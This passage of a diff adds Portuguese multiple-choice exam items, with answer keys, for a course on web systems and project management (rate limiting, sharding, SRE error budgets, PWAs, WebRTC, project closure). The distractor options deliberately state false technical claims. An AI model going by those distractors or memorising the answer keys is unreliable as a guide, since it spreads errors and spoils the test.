+      "Long tasks de 180ms durante scroll afetam exclusivamente o CLS: quando JavaScript pesado executa durante scroll, elementos da página se deslocam inesperadamente pois o layout não consegue ser recalculado — a solução é mover o código para um web worker que execute fora do main thread sem afetar o layout.",
+      "Long tasks não afetam Core Web Vitals: FCP, LCP, FID e CLS são métricas de carregamento inicial da página — comportamentos durante scroll são capturados apenas por métricas de interação como INP (Interaction to Next Paint) que não faz parte dos Core Web Vitals reportados pelo Google Lighthouse.",
+      "Por 180 ms o thread principal fica bloqueado e não responde ao usuário, o que piora o INP (que substituiu o FID nos Core Web Vitals em 2024); a solução é quebrar a tarefa ou levá-la a um web worker.",
+      "A long task de 180ms é aceitável: o limite para tarefas bloqueantes é 200ms segundo as especificações do W3C — tarefas abaixo de 200ms não aparecem como problemas no relatório do Lighthouse e não causam degradação perceptível de FID; o desenvolvedor deve focar em outras otimizações de maior impacto antes de refatorar uma função de 180ms."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap7-m8",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap7",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma API RESTful retorna código 429 para um cliente que faz 150 requisições por minuto. O desenvolvedor propõe simplesmente aumentar o limite para 500 requisições por minuto. Por que essa solução pode ser inadequada e quais alternativas preservam tanto a funcionalidade quanto a estabilidade do sistema?",
+    "alternativas": [
+      "Aumentar o limite para 500 é a solução correta: rate limiting conservador causa degradação de experiência desnecessária — limites devem ser configurados apenas baseados na capacidade máxima do servidor, e se a infraestrutura suporta 500 req/min por cliente, nenhum limite inferior é justificável tecnicamente.",
+      "150 req/min pode ser uso ineficiente; antes de subir o limite, é melhor analisar o padrão de uso, adotar cache no cliente e endpoints em lote, informar o limite restante nos headers e só escalar se o uso for legítimo.",
+      "O 429 indica servidor à beira do colapso; o cliente deve ser bloqueado de vez.",
+      "Rate limiting não deveria ser implementado em APIs internas: o código 429 é adequado apenas para APIs públicas expostas a usuários não confiáveis — para clientes internos da mesma organização, throttling causa mais problemas do que resolve e deve ser substituído por monitoramento de uso sem restrições automáticas."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap7-m9",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap7",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um sistema usa sharding de banco de dados com 4 shards baseados no ID do usuário (0-25%: shard1, 26-50%: shard2, etc.). Após 6 meses, o shard1 tem 3x mais dados e queries que os demais. Qual problema arquitetural isso representa e como resolvê-lo?",
+    "alternativas": [
+      "Falta replicação: basta criar mais réplicas de leitura para o shard1.",
+      "É um hot shard: dividir por faixa de ID concentrou usuários mais ativos no shard1; a solução é particionar por hash (ou consistent hashing), rebalancear os dados e monitorar a distribuição de carga.",
+      "O problema é de escalabilidade vertical insuficiente do shard1: servidores com mais dados naturalmente processam mais queries — a solução é aumentar CPU e memória do shard1 proporcionalmente ao seu volume de dados, equilibrando assim a capacidade de processamento sem necessidade de alterar a estratégia de distribuição existente.",
+      "O problema indica que sharding foi implementado prematuramente: com apenas 4 shards e 6 meses de operação, o sistema ainda não tem volume suficiente para justificar sharding — a solução é consolidar os 4 shards em um único banco de dados otimizado com índices adequados, que suportaria o volume atual com melhor performance do que a arquitetura distribuída."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap7-m10",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap7",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma equipe de SRE define: SLI de latência P95 < 200ms, SLO de 99,5% das semanas cumprindo esse SLI, e Error Budget mensal calculado em 3,6 horas. Na segunda semana do mês, o sistema violou o SLI por 2,5 horas devido a um deploy problemático. O que essa situação implica para o restante do mês?",
+    "alternativas": [
+      "Nada muda: cada semana é independente e não consome o budget das seguintes.",
+      "Das 3,6 horas, 2,5 já foram usadas e restam 1,1 hora; a equipe deve reduzir a frequência e o risco dos deploys, priorizar estabilidade e investigar a causa do deploy problemático.",
+      "O Error Budget restante de 1,1 hora é suficiente para continuar o ritmo normal de desenvolvimento: 1,1 hora representa 99,85% de uptime no tempo restante do mês, que é muito superior ao SLO de 99,5% — a equipe tem margem confortável para continuar com deploys diários sem preocupação com o budget consumido.",
+      "A violação de 2,5 horas por deploy problemático não conta para o Error Budget: o orçamento de erro foi criado para falhas de infraestrutura e comportamentos inesperados do sistema — violações causadas por deploys são responsabilidade da equipe de desenvolvimento, não de SRE, e devem ser contabilizadas em métricas separadas de qualidade de deploy."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap8-m1",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap8",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa chama de \"projeto\" o processo mensal de folha de pagamento, que segue sempre os mesmos passos e equipe. Um gerente discorda e afirma que isso é operação rotineira. Qual é a distinção correta e por que ela importa para a gestão?",
+    "alternativas": [
+      "O gerente está errado: qualquer atividade com prazo definido é um projeto — a folha de pagamento tem data de conclusão mensal, o que a classifica automaticamente como projeto e exige planejamento específico, cronograma e termo de abertura a cada ciclo.",
+      "O gerente está certo: operações são repetitivas e seguem procedimentos fixos; projetos são temporários e únicos; confundi-los leva a burocratizar rotinas ou a planejar mal iniciativas realmente novas.",
+      "Ambos têm razão parcialmente: a distinção entre projeto e operação depende exclusivamente do tamanho da equipe envolvida — atividades com menos de cinco pessoas são operações; com mais de cinco pessoas passam a ser projetos que exigem gestão formal com termo de abertura e cronograma.",
+      "A distinção é irrelevante na prática: tanto projetos quanto operações devem ser gerenciados da mesma forma, com planejamento completo, cronograma detalhado e documentação formal — a diferença entre os dois conceitos é apenas acadêmica sem impacto nas ferramentas ou no processo de gestão utilizado."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap8-m2",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap8",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um gerente de projetos recebe o seguinte objetivo: \"Fazer um treinamento bom para a equipe o mais rápido possível.\" Aplicando o conceito de objetivo SMART, quais são os problemas dessa formulação e como reescrevê-la adequadamente?",
+    "alternativas": [
+      "O objetivo está adequado: \"bom\" e \"rápido\" são termos relativos que a equipe interpretará contextualmente — objetivos SMART são necessários apenas em projetos de grande porte com múltiplos stakeholders; em projetos simples de treinamento, objetivos informais são aceitos e até preferíveis por serem mais flexíveis.",
+      "Não é específico nem mensurável e não tem prazo; reescrita: \"Treinar 15 funcionários do financeiro em Excel básico, 16 horas, até 30 de agosto, com aprovação mínima de 70%\".",
+      "Só falta o prazo; com uma data, o objetivo já fica SMART.",
+      "O objetivo é adequado para a fase de iniciação: no termo de abertura, objetivos podem ser amplos e vagos pois serão detalhados nas etapas seguintes de planejamento — a precisão SMART só é exigida na Estrutura Analítica do Projeto e nos requisitos, não no documento de abertura que por definição tem caráter preliminar."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap8-m3",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap8",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma gerente inicia um projeto de reforma de escritório e cria a EAP incluindo apenas: demolição, construção e pintura. Ao final, descobre que precisava trocar a rede elétrica para suportar os novos equipamentos, o que não estava no escopo. Qual princípio da EAP foi violado e como prevenir esse problema?",
+    "alternativas": [
+      "O problema foi de execução, não de EAP: a equipe deveria ter identificado a necessidade elétrica durante a obra e comunicado imediatamente ao gerente — EAPs bem elaboradas nunca preveem todos os detalhes técnicos de execução, pois isso é responsabilidade dos profissionais que executam o trabalho.",
+      "Faltou completude: a EAP deve ter todo o trabalho necessário, e a rede elétrica era essencial; especialistas, comparação com reformas parecidas e lições aprendidas teriam revelado isso.",
+      "O problema foi de gerenciamento de riscos, não de EAP: a necessidade elétrica era um risco previsível que deveria ter sido listado no registro de riscos — a EAP estava correta com suas três fases, e o problema poderia ter sido evitado apenas com um plano de resposta a riscos adequado desde o início do projeto.",
+      "Foi problema de cronograma: bastava uma tarefa de \"verificação elétrica\"."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap8-m4",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap8",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um projeto de médio porte tem duração de 8 meses e equipe de 12 pessoas. O gerente usa apenas as ferramentas de um projeto pequeno: uma planilha simples de tarefas e e-mails para comunicação. Quais problemas essa abordagem inadequada pode gerar?",
+    "alternativas": [
+      "Não há problema: tamanho não determina as ferramentas necessárias — um gerente experiente consegue gerenciar qualquer projeto com planilha e e-mail; ferramentas mais complexas são marketing das consultorias e não agregam valor real em projetos de qualquer porte.",
+      "Com 12 pessoas e 8 meses, a planilha não dá controle de versões nem visão compartilhada, e e-mails espalhados perdem decisões; o projeto pede quadros colaborativos e documentação centralizada na nuvem.",
+      "O único problema é o e-mail; troque por WhatsApp e mantenha a planilha.",
+      "O problema ocorre apenas se houver processos formais de aquisição: projetos médios com compras diretas e sem licitações podem ser gerenciados com as mesmas ferramentas de projetos pequenos — a complexidade adicional só se justifica quando existem processos formais de contratação que demandam rastreabilidade documental rigorosa."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap8-m5",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap8",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Durante a execução de um projeto de implantação de sistema, um stakeholder solicita adicionar um módulo de relatórios avançados que não estava no escopo original. O gerente aceita imediatamente sem avaliar impacto. Quais são as consequências dessa decisão e como deveria ter sido tratada?",
+    "alternativas": [
+      "A decisão do gerente foi correta: em projetos ágeis e modernos, aceitar mudanças de escopo rapidamente demonstra flexibilidade e foco no cliente — avaliar impacto antes de aceitar cria burocracia desnecessária que prejudica o relacionamento com stakeholders e atrasa a entrega de valor.",
+      "A consequência é apenas de cronograma: adicionar um módulo estende o prazo do projeto, mas isso é gerenciável com horas extras da equipe — o processo correto seria aceitar a mudança e imediatamente informar o stakeholder sobre o prazo adicional necessário, sem necessidade de análise formal de impacto.",
+      "Faltou controle de mudanças: o pedido deveria ser registrado, avaliado quanto a escopo, prazo, custo e riscos, comparado com a justificativa do projeto e só então aprovado e replanejado, ou recusado.",
+      "O problema é exclusivamente de comunicação: o gerente deveria ter informado todos os outros stakeholders sobre a mudança antes de aceitá-la — em projetos de implantação de sistemas, qualquer alteração de escopo é automaticamente aprovada pelo patrocinador assim que o gerente a aceita, sem necessidade de análise técnica adicional."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap8-m6",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap8",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um gerente encerra um projeto de desenvolvimento de software enviando um e-mail para a equipe dizendo \"o projeto acabou, obrigado\". Os usuários finais nunca foram comunicados formalmente e não receberam treinamento. Quais elementos essenciais do encerramento foram negligenciados?",
+    "alternativas": [
+      "O encerramento foi adequado: em projetos de software, o deploy em produção já configura o encerramento formal — comunicações adicionais aos usuários são responsabilidade da área de operações, não do gerente de projetos, que cumpriu sua função ao finalizar o desenvolvimento e comunicar a equipe.",
+      "Faltaram o aceite formal dos usuários, a transição (treinamento e documentação), a comunicação de encerramento a todos e o registro de lições aprendidas; encerrar é concluir com propósito.",
+      "Só faltaram as lições aprendidas; entregar o sistema já é o aceite.",
+      "O encerramento foi parcialmente adequado: faltou apenas documentar as lições aprendidas — a comunicação à equipe é o encerramento formal do projeto segundo as melhores práticas, e o treinamento de usuários é uma atividade operacional pós-projeto que não faz parte do escopo do gerenciamento de projetos."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap8-m7",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap8",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um gerente de projetos experiente começa um novo projeto de organização de evento corporativo e afirma que não precisa de termo de abertura pois \"já fez isso dezenas de vezes e sabe o que fazer\". Por que essa postura é problemática segundo os fundamentos estudados?",
+    "alternativas": [
+      "A postura é correta para gerentes experientes: o termo de abertura é uma formalidade burocrática criada para gerentes iniciantes sem experiência acumulada — profissionais com histórico comprovado de sucesso em projetos similares têm implicitamente o alinhamento de expectativas que o documento formalizaria.",
+      "Cada projeto é único, com equipe, orçamento e stakeholders próprios; o termo de abertura autoriza o projeto, nomeia responsáveis e registra o objetivo, servindo de base se a justificativa mudar.",
+      "A postura é problemática apenas se houver múltiplos patrocinadores: quando um único patrocinador e gerente são a mesma pessoa experiente, o alinhamento de expectativas acontece naturalmente sem necessidade de formalização — o termo de abertura só é obrigatório quando há separação formal entre patrocinador, gerente e cliente do projeto.",
+      "Eventos pequenos, abaixo de R$ 50 mil, dispensam o termo de abertura."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap8-m8",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap8",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Durante o monitoramento de um projeto, o gerente identifica que 40% das tarefas estão atrasadas, o orçamento está 25% acima do planejado e dois riscos críticos se materializaram sem resposta preparada. O indicador de status seria qual cor e quais ações são prioritárias?",
+    "alternativas": [
+      "O status seria amarelo: atrasos de 40% e desvio de 25% no orçamento são problemas moderados que se resolvem com horas extras da equipe — riscos materializados sem resposta são comuns em projetos e serão tratados naturalmente à medida que a equipe os identifica durante a execução das tarefas restantes.",
+      "Vermelho: 40% de atraso e 25% acima do custo são desvios críticos, e riscos sem resposta mostram falha na gestão de riscos; pedem reunião de crise, análise de causa, replanejamento, contingências e comunicação ao patrocinador.",
+      "Amarelo no prazo e vermelho só nos riscos; os 25% de custo extra são normais, e só os riscos sem resposta preparada exigem atenção.",
+      "Não é possível definir o status sem saber o tamanho total do projeto: 40% de atraso em um projeto de 2 semanas é crítico, mas em um projeto de 2 anos pode ser recuperável — o gerente deve primeiro calcular o índice de desempenho de cronograma e custo com análise de valor agregado antes de atribuir qualquer cor de status ao projeto."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap8-m9",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap8",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um gerente elabora uma lista de riscos para um projeto de treinamento e inclui: \"o preço da gasolina pode subir\", \"pode chover no dia do evento presencial\" e \"o instrutor contratado pode adoecer e não comparecer\". Avaliando os três critérios de um risco válido, qual análise está correta?",
+    "alternativas": [
+      "Os três são riscos válidos: todos são eventos futuros incertos que podem afetar qualquer projeto — gasolina impacta o custo de deslocamento, chuva afeta o conforto dos participantes e a ausência do instrutor compromete a entrega; o registro de riscos deve ser o mais abrangente possível para garantir cobertura completa.",
+      "Só a ausência do instrutor é um risco válido: é futura, incerta e afeta a entrega; chuva só importa se o evento for ao ar livre, e a gasolina, se o deslocamento estiver no orçamento; sem impacto não há risco.",
+      "Nenhum dos três é risco válido: riscos de projetos de treinamento devem ser exclusivamente relacionados ao conteúdo didático e à qualidade do material — eventos externos como clima, preços e saúde de terceiros são forças maiores fora do controle do gerente e por definição não podem ser gerenciados, portanto não devem constar no registro de riscos.",
+      "Chuva e ausência do instrutor são riscos válidos, mas preço da gasolina não: variáveis macroeconômicas como preços de combustível nunca são riscos de projetos segundo as melhores práticas internacionais — apenas eventos diretamente relacionados às entregas do projeto e às pessoas da equipe são elegíveis para o registro de riscos."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap8-m10",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap8",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Após concluir cinco projetos consecutivos de implantação de sistemas, um gerente percebe que em todos eles o maior problema foi a resistência dos usuários ao novo sistema. Qual é a contribuição das lições aprendidas nesse cenário e como transformar esse padrão em melhoria de processo?",
+    "alternativas": [
+      "Lições aprendidas não resolvem resistência de usuários: esse é um problema comportamental e cultural que requer intervenção da área de RH e psicologia organizacional — o gerente de projetos não tem ferramentas para tratar resistência à mudança, que é uma variável humana fora do escopo da gestão de projetos.",
+      "Basta incluir uma tarefa de treinamento no cronograma do próximo projeto.",
+      "O padrão vira melhoria de processo: os próximos projetos já incluem gestão da mudança no escopo, comunicação no plano, usuários resistentes nos riscos e requisitos de engajamento.",
+      "O padrão identificado indica que os projetos falharam: cinco projetos com o mesmo problema recorrente configuram incompetência do gerente em gestão de stakeholders — a solução não é documentar lições aprendidas, mas contratar um gerente com experiência específica em gestão de mudança organizacional para os próximos projetos de implantação de sistemas."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap9-m1",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap9",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma startup decide adotar WebTransport em produção para seu sistema de chat em tempo real por ser \"mais moderno que WebSockets\". Analisando os critérios de avaliação de tecnologias emergentes, quais riscos essa decisão envolve e como deveria ser conduzida?",
+    "alternativas": [
+      "A decisão é acertada: tecnologias mais modernas sempre oferecem melhor performance e devem ser adotadas imediatamente em produção — empresas que esperam confirmação de maturidade perdem vantagem competitiva e ficam atrás de concorrentes que adotam inovações antecipadamente.",
+      "WebTransport ainda é emergente, com suporte parcial e especificação sujeita a mudanças; o certo é checar o suporte, fazer um piloto controlado, manter WebSockets como alternativa e migrar só depois de validar.",
+      "Não há risco: para chat, os dois são equivalentes, e é só preferência.",
+      "O único risco é de performance: tecnologias emergentes consomem mais recursos do servidor por não serem otimizadas — a solução é aumentar a infraestrutura de backend em 50% antes de migrar para WebTransport, garantindo capacidade suficiente para compensar a ineficiência natural de tecnologias que ainda não atingiram maturidade."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap9-m2",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap9",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "O Twitter Lite migrou para PWA e obteve redução de 70% no consumo de dados e 65% de aumento nas páginas por sessão. Quais tecnologias core das PWAs explicam esses resultados e por que eles são significativos para mercados emergentes?",
+    "alternativas": [
+      "Só o Manifest, que permite instalar sem loja; Service Workers só servem para push.",
+      "Os Service Workers fazem cache dos recursos estáticos e evitam baixá-los de novo, o que explica os 70% de dados a menos; com tudo mais rápido em rede lenta, as sessões rendem mais páginas, o que pesa em mercados com 3G e planos limitados.",
+      "A redução de dados foi obtida apenas pela compressão de imagens e uso de formatos modernos como WebP — Service Workers e Web App Manifest não têm relação direta com consumo de dados; o aumento de páginas por sessão foi resultado de melhorias no algoritmo de recomendação de conteúdo, não de mudanças tecnológicas na camada de PWA.",
+      "Os resultados são específicos do Twitter e não se replicam em outras aplicações: a redução de 70% no consumo de dados decorreu de otimizações proprietárias no código JavaScript, e não das tecnologias PWA em si — PWAs oferecem apenas a funcionalidade de instalação na tela inicial, sem impacto mensurável em performance ou consumo de rede."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap9-m3",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap9",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor precisa implementar reconhecimento de imagem em tempo real preservando a privacidade do usuário. Ele considera duas abordagens: (A) enviar imagens para uma API de visão computacional no servidor, ou (B) rodar o modelo diretamente no navegador via TensorFlow.js. Qual é a análise correta de cada abordagem?",
+    "alternativas": [
+      "A abordagem A é sempre superior: APIs de servidor têm modelos mais precisos, menor latência total e não sobrecarregam o dispositivo do usuário — TensorFlow.js no navegador é adequado apenas para demonstrações acadêmicas sem aplicação prática em sistemas de produção.",
+      "As abordagens são equivalentes em privacidade: tanto o processamento no servidor quanto no cliente resultam no mesmo nível de exposição de dados do usuário — a diferença real é apenas de custo operacional, sendo a API de servidor mais barata por aproveitar economia de escala da infraestrutura em nuvem.",
+      "Em B, as imagens não saem do aparelho, o que preserva a privacidade; em A, dados pessoais vão a terceiros, com obrigações de LGPD e risco de vazamento; B depende do hardware e pode ser menos preciso.",
+      "A abordagem A é a única válida para privacidade: processar dados no servidor da própria empresa garante controle total sobre as informações — APIs de terceiros como TensorFlow.js são mantidas pelo Google e enviam metadados de uso para servidores externos, comprometendo a privacidade dos usuários de forma mais grave do que uma API própria bem configurada."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap9-m4",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap9",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa de e-commerce está avaliando migrar para arquitetura Jamstack. O CTO questiona como um site \"estático\" pode ter conteúdo dinâmico como preços atualizados, estoque em tempo real e carrinho de compras. Como explicar essa aparente contradição?",
+    "alternativas": [
+      "O CTO tem razão na preocupação: Jamstack é inadequado para e-commerce com dados dinâmicos — é uma arquitetura para sites informativos e blogs estáticos; lojas virtuais com preços variáveis, controle de estoque e transações precisam obrigatoriamente de arquiteturas com servidor de aplicação tradicional sempre ativo.",
+      "\"Estático\" é o HTML pré-gerado servido por CDN; o dinâmico vem de APIs chamadas por JavaScript, como preço e estoque em tempo real e carrinho em funções serverless, unindo performance e dados atuais.",
+      "A cada mudança de preço o site inteiro é reconstruído, e o usuário nem percebe.",
+      "A arquitetura Jamstack usa WebSockets para manter conexão permanente entre CDN e banco de dados — isso permite que o HTML \"estático\" seja atualizado em tempo real com dados de preço e estoque sem reconstrução do site; é a combinação de edge computing com WebSockets que torna o Jamstack adequado para e-commerce de alta frequência de atualizações."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap9-m5",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap9",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor implementa um Web Component <rating-stars> com Shadow DOM e o disponibiliza como biblioteca npm. Um colega questiona qual é a vantagem real do Shadow DOM em relação a CSS normal com classes específicas. Como responder tecnicamente?",
+    "alternativas": [
+      "Shadow DOM não oferece vantagem real sobre CSS com classes específicas em nomenclatura única: ambas as abordagens atingem o mesmo resultado de isolamento — Shadow DOM é apenas uma abstração mais complexa que adiciona overhead de performance sem benefício prático para componentes simples como estrelas de avaliação.",
+      "A vantagem é só semântica, pois variáveis CSS furam o isolamento.",
+      "O Shadow DOM isola nos dois sentidos: o CSS da página não quebra o componente, e o dele não vaza para a página; com classes, um reset global pode quebrá-lo, e assim o componente funciona igual em qualquer projeto.",
+      "Shadow DOM oferece apenas encapsulamento de JavaScript, não de CSS: a proteção real contra conflitos de estilos em Web Components é obtida através de CSS Modules ou styled-components — Shadow DOM é tecnicamente uma API de renderização que melhora a performance de repaint mas não resolve o problema de isolamento de estilos que o colega mencionou."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap9-m6",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap9",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um aplicativo de telemedicina precisa de videochamada entre médico e paciente. O desenvolvedor propõe usar WebRTC puro sem servidor TURN, afirmando que \"WebRTC é P2P e não precisa de servidor\". Por que essa afirmação é tecnicamente incompleta e qual é o risco para a aplicação?",
+    "alternativas": [
+      "A afirmação está completamente correta: WebRTC é 100% P2P por definição e não requer nenhuma infraestrutura de servidor — qualquer menção a STUN ou TURN é mito perpetuado por fornecedores de serviços de comunicação para justificar cobranças desnecessárias em projetos que poderiam funcionar sem custos.",
+      "A mídia vai P2P, mas a conexão precisa de servidores: STUN descobre o IP público, e TURN repassa a mídia quando a conexão direta falha (firewalls, NAT simétrico, comuns em hospitais); sem TURN, parte das consultas cai.",
+      "O único servidor necessário é o de sinalização para troca de SDP: STUN e TURN são otimizações opcionais que melhoram a taxa de conexão em menos de 1% dos casos — para telemedicina em ambiente controlado como hospitais com infraestrutura de rede dedicada, implementar TURN adiciona complexidade desnecessária sem benefício prático para os usuários finais.",
+      "Não faz falta, pois médicos e pacientes sempre usam redes domésticas simples."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap9-m7",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap9",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma equipe avalia adotar WebAssembly para melhorar a performance de um editor de planilhas online. O líder técnico afirma que \"Wasm substituirá o JavaScript no frontend\". Qual é a análise técnica correta sobre a relação entre WebAssembly e JavaScript?",
+    "alternativas": [
+      "O líder técnico está correto: WebAssembly é tecnicamente superior ao JavaScript em todos os aspectos de desenvolvimento frontend — performance, legibilidade do código, ecossistema de ferramentas e suporte de navegadores; a transição completa do mercado de JS para Wasm é inevitável e deve acontecer nos próximos 3 a 5 anos.",
+      "WebAssembly substituirá JavaScript apenas para aplicações críticas de performance como jogos e editores — para sites informativos, blogs e e-commerces simples, JavaScript permanecerá como tecnologia principal; a coexistência é temporária e em 10 anos todo o desenvolvimento web será feito em Rust ou C++ compilados para Wasm.",
+      "Wasm complementa o JavaScript: não acessa o DOM direto e depende do JS como ponte; JS cuida da interface e dos eventos, e Wasm, dos cálculos pesados da planilha.",
+      "WebAssembly é inadequado para editores de planilhas: a vantagem de Wasm é exclusivamente em gráficos 3D e jogos, onde a GPU é intensamente utilizada — para processamento de dados em memória como cálculos de planilhas, JavaScript otimizado com V8 tem performance equivalente ou superior ao WebAssembly sem a complexidade adicional de compilar código C++ ou Rust."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap9-m8",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap9",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um estudante de desenvolvimento web quer aprender tecnologias emergentes e decide começar diretamente com WebGPU, WebXR e WebTransport sem dominar HTML, CSS e JavaScript. Por que essa estratégia é problemática segundo os critérios do material?",
+    "alternativas": [
+      "É válida para quem já programa em Python ou Java, que pode pular os fundamentos.",
+      "Tecnologias emergentes se apoiam nos fundamentos: WebGPU exige JS avançado, WebXR pede base em WebGL e 3D, e WebTransport, redes e código assíncrono; sem HTML, CSS e JS, o estudante não consegue depurar nem construir.",
+      "O problema é exclusivamente de mercado de trabalho: empresas não contratam especialistas em tecnologias emergentes sem experiência em tecnologias consolidadas — a decisão de aprender WebGPU e WebXR diretamente é tecnicamente viável, mas estrategicamente desvantajosa para encontrar emprego; o estudante deveria aprender fundamentos apenas por questões de empregabilidade, não por necessidade técnica.",
+      "A estratégia é problemática apenas para WebGPU e WebXR por serem muito complexos: WebTransport pode ser aprendido sem fundamentos pois é similar ao WebSockets que tem curva de aprendizado baixa — o estudante poderia começar por WebTransport para ganhar confiança e depois estudar fundamentos antes de avançar para as tecnologias graficamente intensas."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap9-m9",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap9",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa analisa adotar Service Workers com estratégia \"Cache First\" para todos os recursos de sua aplicação bancária. O desenvolvedor argumenta que isso maximiza a performance. Qual é o problema dessa abordagem generalizada e como escolher a estratégia correta?",
+    "alternativas": [
+      "Cache First é a estratégia ideal para aplicações bancárias: dados financeiros em cache local são mais seguros do que dados transmitidos pela rede — um usuário offline com dados em cache tem acesso garantido às suas informações mesmo durante quedas do servidor bancário.",
+      "Cache First mostra saldo e extrato desatualizados; use Network First para dados dinâmicos, Cache First só para estáticos (CSS, JS, ícones) e Stale While Revalidate para o que tolera atraso.",
+      "O problema é só regulatório; com cache criptografado, Cache First vale para tudo.",
+      "Service Workers com qualquer estratégia de cache são inadequados para aplicações bancárias: o ambiente bancário exige que cada requisição seja validada pelo servidor em tempo real — implementar cache de qualquer tipo viola os princípios de auditoria e rastreabilidade obrigatórios para sistemas financeiros regulados pelo Banco Central."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap9-m10",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap9",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Em 2025, CSS Grid está classificado como tecnologia mainstream, mas em 2011 era experimental. Uma empresa decide não usar CSS Container Queries por estar \"em fase de adoção inicial\". Aplicando o ciclo de vida das tecnologias web, essa decisão é sempre correta?",
+    "alternativas": [
+      "A decisão é sempre correta: tecnologias em adoção inicial nunca devem ser usadas em produção — o caso do CSS Grid mostra que tecnologias experimentais levam anos para atingir maturidade e empresas que as adotam precocemente assumem riscos desproporcionais sem benefícios tangíveis durante o período de transição.",
+      "A decisão é sempre incorreta: o ciclo de vida mostra que todas as tecnologias emergentes eventualmente se tornam mainstream — empresas que adotam em adoção inicial ganham vantagem competitiva; rejeitar CSS Container Queries significa que a empresa também rejeitaria CSS Grid em 2015, perdendo 2 anos de vantagem sobre concorrentes.",
